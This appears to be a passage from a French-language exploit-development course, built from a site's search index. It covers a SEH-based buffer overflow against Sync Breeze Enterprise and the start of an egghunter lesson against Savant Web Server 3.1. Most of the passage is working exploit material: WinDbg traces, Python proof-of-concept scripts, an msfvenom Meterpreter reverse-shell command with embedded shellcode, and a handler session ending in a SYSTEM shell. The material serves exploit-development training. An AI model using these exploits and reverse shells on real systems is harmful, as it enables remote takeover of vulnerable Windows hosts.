edi=019efb20\neip=00862a9d esp=019ef9a8 ebp=019efec8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n00862a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n</code></pre> <p>La commande <code>exchain</code> nous affiche bien <code>1015a2f0</code> qui est l'adresse contenant la s\u00e9quence P/P/R :</p> <pre><code>0:009&gt; !exchain\n019efe1c: libpal!md5_starts+149fb (008ddf5b)\n019eff54: *** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libspp.dll\nlibspp!pcre_exec+16460 (1015a2f0)\nInvalid exception stack at 06eb9090\n</code></pre> <p>On positionne de nouveau un point d'arr\u00eat sur cette adresse et on relance l'ex\u00e9cution :</p> <pre><code>#\n0:009&gt; bp 0x1015a2f0\n#\n0:009&gt; g\n</code></pre> <p>Le point d'arr\u00eat et atteint et on d\u00e9roule pas \u00e0 pas la s\u00e9quence P/P/R :</p> <pre><code>#\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=019ef438 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n#\n0:009&gt; r\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=019ef438 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n#\n0:009&gt; t\neax=77853b02 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f1 esp=019ef43c ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16461:\n1015a2f1 5b              pop     ebx\n#\n0:009&gt; t\neax=77853b02 ebx=019ef540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f2 esp=019ef440 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16462:\n1015a2f2 c3              ret\n</code></pre> <p>On arrive sur les deux instructions <code>NOP</code> qui pr\u00e9c\u00e8dent le short jump :</p> <pre><code># 1er NOP (90)\n0:009&gt; t\neax=77853b02 ebx=019ef540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019eff54 esp=019ef444 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019eff54 90              nop\n# 2em NOP (90)\n0:009&gt; t\neax=77853b02 ebx=019ef540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019eff55 esp=019ef444 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019eff55 90              nop\n# Short JUMP `eb06`\n0:009&gt; t\neax=77853b02 ebx=019ef540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019eff56 esp=019ef444 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019eff56 eb06            jmp     019eff5e\n</code></pre> <p>Apr\u00e8s ex\u00e9cution du short jump on est dans notre payload juste apr\u00e8s le SEH :</p> <pre><code>0:009&gt; dd 019eff5e - 0x06\n019eff58  1015a2f0 43434343 43434343 43434343\n019eff68  43434343 43434343 43434343 43434343\n019eff78  43434343 43434343 43434343 43434343\n019eff88  43434343 43434343 43434343 43434343\n019eff98  43434343 43434343 43434343 43434343\n019effa8  43434343 43434343 43434343 43434343\n019effb8  43434343 43434343 43434343 43434343\n019effc8  43434343 43434343 43434343 43434343\n</code></pre> <p>Si on affiche plus en d\u00e9tail le payload on se rend compte qu'il est tronqu\u00e9 et proche du d\u00e9but de la pile :</p> <pre><code>[...]\neax=77853b02 ebx=019ef540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019eff56 esp=019ef444 ebp=019ef458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019eff56 eb06            jmp     019eff5e\n#\n0:009&gt; dd eip L30\n019eff56  a2f006eb 43431015 43434343 43434343\n019eff66  43434343 43434343 43434343 43434343\n019eff76  43434343 43434343 43434343 43434343\n019eff86  43434343 43434343 43434343 43434343\n019eff96  43434343 43434343 43434343 43434343\n019effa6  43434343 43434343 43434343 43434343\n019effb6  43434343 43434343 43434343 43434343\n019effc6  43434343 43434343 43434343 43434343\n019effd6  43434343 ff004343 2910019e ffff7781\n019effe6  3c67ffff 00007785 00000000 3e100000\n019efff6  65480089 000000dc ???????? ????????\n019f0006  ???????? ???????? ???????? ????????\n0:009&gt; !teb\nTEB at 002b2000\n    ExceptionList:        019ef44c\n    StackBase:            019f0000                # D\u00e9but de la stack\n[...]\n</code></pre> <p>Il n'y a pas assez d'espace ici pour stocker un reverse shell Meterpreter.</p> <p>La preuve de concept envoie pr\u00e8s de 1000 octets qui ne sont pas pr\u00e9sents \u00e0 cet endroit l\u00e0. On veut identifier l'espace en m\u00e9moire o\u00f9 ils sont stock\u00e9s pour y jump et y stocker le shellcode.</p> <p>On modifie la preuve de concept de fa\u00e7on \u00e0 stocker le futur shellcode dans une variable distincte avec un contenu facilement identifiable :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  shellcode = b\"\\x43\" * 400\n\n  inputBuffer = b\"\\x41\" * 124\n  inputBuffer += pack(\"&lt;L\",(0x06eb9090))             # (NSEH)\n  inputBuffer += pack(\"&lt;L\", (0x1015a2f0))            # (SEH)  P/P/R\n  inputBuffer += b\"\\x90\" * (size - len(inputBuffer) - len(shellcode))\n  inputBuffer += shellcode\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <ul> <li>Access violation</li> <li>D\u00e9finition du point d'arr\u00eat comme pr\u00e9c\u00e9demment sur l'exception_handler</li> <li>Relancer l'ex\u00e9cution</li> <li>Ex\u00e9cution de la s\u00e9quence P/P/R</li> <li>Ex\u00e9cution du short jump</li> <li>Ex\u00e9cution des instructions <code>NOP</code></li> </ul> <pre><code>0:009&gt; g\n(d24.155c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\neax=41414141 ebx=019bfa1c ecx=019bff18 edx=019bf9d4 esi=019bff18 edi=019bfb20\neip=008d2a9d esp=019bf9a8 ebp=019bfec8 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n008d2a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n0:009&gt; !exchain\n019bfe1c: libpal!md5_starts+149fb (0094df5b)\n019bff54: *** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libspp.dll\nlibspp!pcre_exec+16460 (1015a2f0)\nInvalid exception stack at 06eb9090\n#\n0:009&gt; bp 0x1015a2f0\n0:009&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=019bf438 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n#\n# P/P/R\n#\n0:009&gt; r\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=019bf438 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n0:009&gt; t\neax=77853b02 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f1 esp=019bf43c ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16461:\n1015a2f1 5b              pop     ebx\n0:009&gt; t\neax=77853b02 ebx=019bf540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f2 esp=019bf440 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16462:\n1015a2f2 c3              ret\n#\n# SHORT JUMP\n#\n0:009&gt; t\neax=77853b02 ebx=019bf540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019bff54 esp=019bf444 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019bff54 90              nop\n0:009&gt; t\neax=77853b02 ebx=019bf540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019bff55 esp=019bf444 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019bff55 90              nop\n0:009&gt; t\neax=77853b02 ebx=019bf540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019bff56 esp=019bf444 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019bff56 eb06            jmp     019bff5e\n#\n# DEBUT DES \\x90\n#\n0:009&gt; t\neax=77853b02 ebx=019bf540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=019bff5e esp=019bf444 ebp=019bf458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n019bff5e 90              nop\n</code></pre> <p>On veut maintenant chercher dans toute la pile  le passage de <code>0x90</code> \u00e0 notre shellcode de <code>0x43</code>. Pour cela on r\u00e9cup\u00e8re les adresses de d\u00e9but et de fin de la pile :</p> <pre><code>0:009&gt; !teb\nTEB at 00304000\n    ExceptionList:        019bf44c\n    StackBase:            019c0000\n    StackLimit:           019be000\n[...]\n</code></pre> <p>On recherche dans toute la pile le passage de <code>0x90</code> \u00e0 notre shellcode de <code>0x43</code> :</p> <pre><code>0:009&gt; s -b 019be000 019c0000 90 90 90 90 43 43 43 43 43 43 43 43\n019bfc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC\n</code></pre> <p>On v\u00e9rifie que le shellcode n'est pas tronqu\u00e9 :</p> <pre><code>0:009&gt; dd 019bfc70 L65\n019bfc70  90909090 43434343 43434343 43434343\n019bfc80  43434343 43434343 43434343 43434343\n019bfc90  43434343 43434343 43434343 43434343\n019bfca0  43434343 43434343 43434343 43434343\n019bfcb0  43434343 43434343 43434343 43434343\n019bfcc0  43434343 43434343 43434343 43434343\n019bfcd0  43434343 43434343 43434343 43434343\n019bfce0  43434343 43434343 43434343 43434343\n019bfcf0  43434343 43434343 43434343 43434343\n019bfd00  43434343 43434343 43434343 43434343\n019bfd10  43434343 43434343 43434343 43434343\n019bfd20  43434343 43434343 43434343 43434343\n019bfd30  43434343 43434343 43434343 43434343\n019bfd40  43434343 43434343 43434343 43434343\n019bfd50  43434343 43434343 43434343 43434343\n019bfd60  43434343 43434343 43434343 43434343\n019bfd70  43434343 43434343 43434343 43434343\n019bfd80  43434343 43434343 43434343 43434343\n019bfd90  43434343 43434343 43434343 43434343\n019bfda0  43434343 43434343 43434343 43434343\n019bfdb0  43434343 43434343 43434343 43434343\n019bfdc0  43434343 43434343 43434343 43434343\n019bfdd0  43434343 43434343 43434343 43434343\n019bfde0  43434343 43434343 43434343 43434343\n019bfdf0  43434343 43434343 43434343 43434343\n019bfe00  43434343\n</code></pre> <p>Le payload commence tr\u00e8s pr\u00e9cis\u00e9ment \u00e0 <code>019bfc74</code>, c'est-\u00e0-dire 4 octets apr\u00e8s <code>019bfc70</code> qui contient les <code>90909090</code> :</p> <pre><code>0:009&gt; dd 019bfc74 L65\n019bfc74  43434343 43434343 43434343 43434343\n019bfc84  43434343 43434343 43434343 43434343\n019bfc94  43434343 43434343 43434343 43434343\n[...]\n019bfdf4  43434343 43434343 43434343 43434343\n019bfe04  fffffffe\n</code></pre> <p>Il faut maintenant trouver l'\u00e9cart entre notre pointeur de pile (<code>ESP</code>) et le d\u00e9but du payload. On va utiliser l'espace limit\u00e9 qu'on a pour assembler les instructions qui vont permettre de island hop pour rediriger vers le payload.</p> <p>On soustrait l'adresse ou commence le payload \u00e0 celle contenue dans le pointeur de pile \u00e0 ce moment-l\u00e0 :</p> <pre><code>0:009&gt; ? 019bfc74 - @esp\nEvaluate expression: 2096 = 00000830\n</code></pre> <p>Note : Pour s'assurer que la diff\u00e9rence reste stable, il faut relancer plusieurs fois l'exploit, de pr\u00e9f\u00e9rence sur des syst\u00e8mes diff\u00e9rents. Dans le cas o\u00f9 il y aurait des variations, il est conseill\u00e9 de le pr\u00e9fixer par des <code>NOP</code>.</p> <p>Pour atteindre notre payload on va augmenter <code>ESP</code> (stack pointer) de <code>0x830</code> et ensuite faire <code>JMP ESP</code>. Ce opcode contient des null byte qui est un mauvais caract\u00e8re :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours4]\n\u2514\u2500$ msf-nasm_shell\nnasm &gt; add esp,0x830\n00000000  81C430080000      add esp,0x830\n</code></pre> <p>On fait l'ajout sur le registre <code>sp</code> qui correspond au 16 bits du bas pour contourner ce probl\u00e8me :</p> <pre><code>nasm &gt; add sp,0x830\n00000000  6681C43008        add sp,0x830\nnasm &gt; jmp esp\n00000000  FFE4              jmp esp\n</code></pre> <p>On modifie la preuve de concept en ajoutant les nouveaux opcodes :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  shellcode = b\"\\x90\" * 8\n  shellcode = b\"\\x43\" * (400 - len(shellcode))\n\n  inputBuffer = b\"\\x41\" * 124\n  inputBuffer += pack(\"&lt;L\",(0x06eb9090))             # (NSEH)\n  inputBuffer += pack(\"&lt;L\", (0x1015a2f0))            # (SEH)  P/P/R\n  inputBuffer += b\"\\x90\" * 2\n  inputBuffer += b\"\\x66\\x81\\xc4\\x30\\x08\"             # ADD SP,0x830\n  inputBuffer += b\"\\xff\\xe4\"                         # JMP ESP\n  inputBuffer += b\"\\x90\" * (size - len(inputBuffer) - len(shellcode))\n  inputBuffer += shellcode\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <ul> <li>Access violation</li> <li>D\u00e9finition du point d'arr\u00eat comme pr\u00e9c\u00e9demment sur l'exception_handler</li> <li>Relancer l'ex\u00e9cution</li> <li>Ex\u00e9cution de la s\u00e9quence P/P/R</li> <li>Ex\u00e9cution du short jump</li> <li>Ex\u00e9cution des instructions <code>NOP</code></li> <li>Ex\u00e9cution des instructions permettant de combler l'\u00e9cart jusqu'au payload</li> </ul> <pre><code>0:009&gt; g\n(690.13a8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\neax=41414141 ebx=01c9fa1c ecx=01c9ff18 edx=01c9f9d4 esi=01c9ff18 edi=01c9fb20\neip=00872a9d esp=01c9f9a8 ebp=01c9fec8 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n00872a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n0:009&gt; !exchain\n01c9fe1c: libpal!md5_starts+149fb (008edf5b)\n01c9ff54: *** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libspp.dll\nlibspp!pcre_exec+16460 (1015a2f0)\nInvalid exception stack at 06eb9090\n#\n#\n0:009&gt; bp 0x1015a2f0\n0:009&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=01c9f438 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n#\n# P/P/R\n#\n0:009&gt; r\neax=00000000 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f0 esp=01c9f438 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16460:\n1015a2f0 58              pop     eax\n0:009&gt; t\neax=77853b02 ebx=00000000 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f1 esp=01c9f43c ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16461:\n1015a2f1 5b              pop     ebx\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=1015a2f2 esp=01c9f440 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nlibspp!pcre_exec+0x16462:\n1015a2f2 c3              ret\n#\n# SHORT JUMP\n#\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9ff54 esp=01c9f444 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n01c9ff54 90              nop\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9ff55 esp=01c9f444 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n01c9ff55 90              nop\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9ff56 esp=01c9f444 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n01c9ff56 eb06            jmp     01c9ff5e\n#\n# INCREMENTATION DE ESP\n#\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9ff5e esp=01c9f444 ebp=01c9f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n01c9ff5e 6681c43008      add     sp,830h\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9ff63 esp=01c9fc74 ebp=01c9f458 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286\n01c9ff63 ffe4            jmp     esp {01c9fc74}\n#\n# SHELLCODE\n#\n0:009&gt; dd @esp L4\n01c9fc74  90909090 90909090 43434343 43434343\n0:009&gt; t\neax=77853b02 ebx=01c9f540 ecx=1015a2f0 edx=77853b20 esi=00000000 edi=00000000\neip=01c9fc74 esp=01c9fc74 ebp=01c9f458 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286\n01c9fc74 90              nop\n</code></pre> <p>Visualisation \u00e9quivalente des instructions assembleur mais depuis la fen\u00eatre <code>Disassembly</code> :</p> <pre><code>01c9ff54 90              nop\n01c9ff55 90              nop\n01c9ff56 eb06            jmp     01c9ff5e                       # Permet de jump par dessus `lock mov byte ptr ds:[90901015h],al`\n01c9ff58 f0a215109090    lock mov byte ptr ds:[90901015h],al\n01c9ff5e 6681c43008      add     sp,830h                        # jump ici pour continuer l'ex\u00e9cution\n01c9ff63 ffe4            jmp     esp\n</code></pre> <p>On a maintenant l'espace suffisant pour stocker un payload et les moyens pour s'y rendre.</p>"},{"location":"binary-exploitation/2-seh-overflow/#obtenir-un-shell","title":"Obtenir un shell","text":"<p>G\u00e9n\u00e9ration du reverse shell en utilisant <code>msfvenom</code> :</p> <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -b \"\\x00\\x02\\x0A\\x0D\\xF8\\xFD\" -f python -v shellcode</code></p> <p>Modification du PoC en cons\u00e9quence :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  shellcode = b\"\\x90\" * 20\n  shellcode += b\"\"\n  shellcode += b\"\\xdb\\xc7\\xd9\\x74\\x24\\xf4\\x5f\\xbd\\x04\\x1f\\xda\"\n  shellcode += b\"\\x81\\x2b\\xc9\\xb1\\x59\\x83\\xc7\\x04\\x31\\x6f\\x15\"\n[...]\n  shellcode += b\"\\x63\\xcc\\xae\\xfc\\x94\\x2d\\x4f\\x15\\xf1\\x2e\\x4f\"\n  shellcode += b\"\\x19\\x07\\x13\\x99\\x20\\x7d\\x52\\x19\\x17\\x8e\\xe1\"\n  shellcode += b\"\\x3c\\x3e\\x05\\x09\\x12\\x40\\x0c\"\n  shellcode += b\"\\x43\" * (400 - len(shellcode))\n\n  inputBuffer = b\"\\x41\" * 124\n  inputBuffer += pack(\"&lt;L\",(0x06eb9090))             # (NSEH)\n  inputBuffer += pack(\"&lt;L\", (0x1015a2f0))            # (SEH)  P/P/R\n  inputBuffer += b\"\\x90\" * 2\n  inputBuffer += b\"\\x66\\x81\\xc4\\x30\\x08\"             # ADD SP,0x830\n  inputBuffer += b\"\\xff\\xe4\"                         # JMP ESP\n  inputBuffer += b\"\\x90\" * (size - len(inputBuffer) - len(shellcode))\n  inputBuffer += shellcode\n\n[...]\n</code></pre> <p>Ex\u00e9cution de l'exploit et r\u00e9cup\u00e9ration d'un reverse shell :</p> <pre><code>$ sudo msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST &lt;IP&gt; ; set LPORT &lt;PORT&gt;\" \n[...]\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"binary-exploitation/2-seh-overflow/#reference","title":"R\u00e9f\u00e9rence","text":"<ul> <li>SEH Based Buffer Overflow</li> </ul>"},{"location":"binary-exploitation/3-egghunters/","title":"Egg Hunters","text":"<p>Dans certains cas d'exploitation de d\u00e9passement de tampon, seul un espace m\u00e9moire restreint n'est rendu disponible rendant difficile le stockage du payload. La technique de egghunter a pour objectif d'identifier des zones propices au stockage du payload.</p>"},{"location":"binary-exploitation/3-egghunters/#theorie","title":"Th\u00e9orie","text":"<p>Dans le cas o\u00f9 l'espace du payload est limit\u00e9, il existe deux options :</p> <ul> <li>Utiliser un shellcode plus petit avec moins de fonctionnalit\u00e9</li> <li>Trouver un buffer additionnel dans une autre r\u00e9gion de la m\u00e9moire avant le crash et de rediriger le flot d'ex\u00e9cution vers ce buffer</li> </ul> <p>Si on arrive \u00e0 stocker un buffer plus large ailleurs on peut utiliser le premier buffer pour \u00e9crire un shellcode de type first-stage. L'objectif de ce shellcode sera de rediriger le flot d'ex\u00e9cution vers le deuxi\u00e8me buffer ou on aura assez de place pour stocker un payload plus large.</p> <p>Quand on doit trouver l'adresse m\u00e9moire d'un autre buffer sous notre contr\u00f4le dont l'adresse n'est pas statique on utilise des egghunter.</p> <ul> <li>Un egghunter est un payload first-stage qui permet de chercher le <code>Virtual Address Space</code> (VAS) du processus \u00e0 la recherche d'un egg</li> <li>Un egg est un tag unique qui pr\u00e9c\u00e8de le payload qu'on veut ex\u00e9cuter</li> <li>Une fois le egg trouv\u00e9 le egghunter transfert l'ex\u00e9cution vers le shellcode final en faisant un jump vers l'adresse trouv\u00e9e</li> </ul> <p>Les egghunter sont \u00e9crits dans le cas de probl\u00e8me de restriction m\u00e9moire et sont donc aussi petits que possible :</p> <ul> <li>Ils doivent aussi \u00eatre rapides \u00e0 s'ex\u00e9cuter et \u00e0 trouver le egg pour \u00e9viter de hang l'application trop longtemps</li> <li>Ces payloads doivent aussi g\u00e9rer les access violations d\u00e9clench\u00e9s lors de l'acc\u00e8s \u00e0 de la m\u00e9moire non mapp\u00e9e ou d'adresse \u00e0 laquelle on a pas acc\u00e8s</li> </ul>"},{"location":"binary-exploitation/3-egghunters/#pratique","title":"Pratique","text":"<p>L'exemple utilis\u00e9 sera l'exploit portant sur l'application `Savant Web Server 3.1.</p>"},{"location":"binary-exploitation/3-egghunters/#valider-lexploit","title":"Valider l'exploit","text":"<p>Preuve de concept en Python :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  httpMethod = b\"GET /\"\n  inputBuffer = b\"\\x41\" * size\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  buf = httpMethod + inputBuffer +  httpEndRequest\n\n  print(\"Sending buffer...\")\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((server, port))\n  s.send(buf)\n  s.close()\n\n  print(\"Done!\")\n\nexcept socket.error:\n  print(\"Could not connect!\")\n</code></pre> <p>Si on s'attache au service avec WinDbg et qu'on ex\u00e9cute cette preuve de concept, on obtient le r\u00e9sultat suivant :</p> <pre><code>0:009&gt; g\n(1618.dbc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Savant\\Savant.exe\neax=ffffffff ebx=017d5778 ecx=f1d59770 edx=00000000 esi=017d5778 edi=0041703c\neip=41414141 esp=045fea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n41414141 ??              ???\n</code></pre> <p>\u00c0 premi\u00e8re vue c'est un d\u00e9passement de tampon classique avec contr\u00f4le sur <code>EIP</code>. Apr\u00e8s analyse ce n'est pas le cas :</p> <ul> <li>Dans les d\u00e9passements de tampon classique, le registre <code>ESP</code> pointe sur notre buffer qui va stocker notre shellcode</li> <li>Le buffer r\u00e9\u00e9crirait <code>EIP</code> avec <code>JMP ESP</code> qui redirigerait le flot d'ex\u00e9cution</li> </ul> <p>Si on analyse le contenu de <code>ESP</code> on se rend compte qu'il ne contient que trois bytes de notre shellcode :</p> <pre><code>0:002&gt; dds @esp L5\n045fea2c  00414141 Savant+0x14141           # Seulement 3x `41`\n045fea30  045fea84\n045fea34  0041703c Savant+0x1703c\n</code></pre> <p>Notre buffer est trait\u00e9 comme un string en m\u00e9moire et fini donc par <code>00</code> :</p> <pre><code>0:004&gt; dds @esp L2\n0470ea2c  00414141 Savant+0x14141\n0470ea30  0470ea84\n</code></pre>"},{"location":"binary-exploitation/3-egghunters/#identifier-les-mauvais-caracteres","title":"Identifier les mauvais caract\u00e8res","text":"<p>On modifie la preuve de concept afin d'inclure l'ensemble des caract\u00e8res possible :</p> <pre><code>#!/usr/bin/python                                                                                                           \nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  badchars = (\n    b\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\"\n    b\"\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\"\n    b\"\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\"\n    b\"\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\"\n    